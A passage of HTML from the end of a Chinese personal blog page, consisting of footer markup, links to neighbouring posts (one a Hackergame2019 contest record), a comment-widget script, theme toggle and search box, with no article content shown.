68.335-66.746.153-.655.3-3.1-1.154-4.384s-3.59-.849-5.135-.5q-3.283.746-104.608 69.142-14.845 10.194-26.894 9.934c-8.855-.191-25.888-5.006-38.551-9.123-15.531-5.048-27.875-7.717-26.8-16.291q.84-6.7 18.45-13.7 108.446-47.248 144.628-62.3c68.872-28.647 83.183-33.623 92.511-33.789 2.052-.034 6.639.474 9.61 2.885a10.452 10.452.0 013.53 6.716A43.765 43.765.0 01362.952 176.66z"/></svg></span></a></div></div></div></div><div class=pt-8><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex justify-between pt-3"><span><a class="flex group" href=/posts/hackergame2019/><span class="mr-3 ltr:inline rtl:hidden text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400">&larr;</span>
<span class="ml-3 ltr:hidden rtl:inline text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400">&rarr;</span>
<span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">Hackergame2019 比赛记录</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime="2019-10-15 10:29:23 +0000 UTC">2019-10-15</time></span></span></a></span>
<span><a class="flex text-right group" href=/posts/ipv6-tunnel/><span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">舍近求远：开通 IPv6 隧道</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime="2019-09-26 22:34:18 +0000 UTC">2019-09-26</time></span></span>
<span class="ml-3 ltr:inline rtl:hidden text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400">&rarr;</span>
<span class="mr-3 ltr:hidden rtl:inline text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400">&larr;</span></a></span></div></div></footer><script src=//unpkg.com/valine/dist/Valine.min.js></script><div id=vcomments class="mt-8 max-w-prose print:hidden"></div><script>new Valine({el:"#vcomments",appId:"RkxCznUcvfzFBgfMiMr0BAfd-gzGzoHsz",appKey:"sw2sEPOl4haCAXKUFYiBFMrR",avatar:"robohash",requiredFields:["nick"]})</script></article><div class="absolute top-[100vh] ltr:right-0 rtl:left-0 w-12 pointer-events-none bottom-0"><a href=#the-top class="w-12 h-12 sticky pointer-events-auto top-[calc(100vh-5.5rem)] bg-neutral/50 dark:bg-neutral-800/50 backdrop-blur rounded-full text-xl flex items-center justify-center text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400" aria-label="Scroll to top" title="Scroll to top">&uarr;</a></div></main><footer class="py-10 print:hidden"><nav class="pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400"><ul class="flex flex-col list-none sm:flex-row"><li class="mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href=https://creativecommons.org/licenses/by-nc/4.0/ title>CC BY-NC 4.0</a></li></ul></nav><div class="flex items-center justify-between"><div><p class="text-sm text-neutral-500 dark:text-neutral-400">&copy;
2023
Mercury</p><p class="text-xs text-neutral-500 dark:text-neutral-400">由 <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://git.io/hugo-congo target=_blank rel="noopener noreferrer">Congo</a> 强力驱动</p></div><div class="text-sm cursor-pointer text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-14 rtl:ml-14"><button id=appearance-switcher class="w-12 h-12" type=button title=切换为深色模式>
<span class="inline dark:hidden"><span class="relative inline-block align-text-bottom icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></span><span class="hidden dark:inline"><span class="relative inline-block align-text-bottom icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></span></button></div></div></footer><div id=search-wrapper class="fixed inset-0 z-50 flex flex-col p-4 sm:p-6 md:p-[10vh] lg:p-[12vh] w-screen h-screen cursor-default bg-neutral-500/50 backdrop-blur-sm dark:bg-neutral-900/50 invisible" data-url=https://blog.sigmerc.top><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg border-neutral-200 top-20 bg-neutral dark:bg-neutral-800 dark:border-neutral-700"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative inline-block align-text-bottom icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-transparent focus:outline-2" placeholder=Search tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400" title="Close (Esc)">
<span class="relative inline-block align-text-bottom icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentcolor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>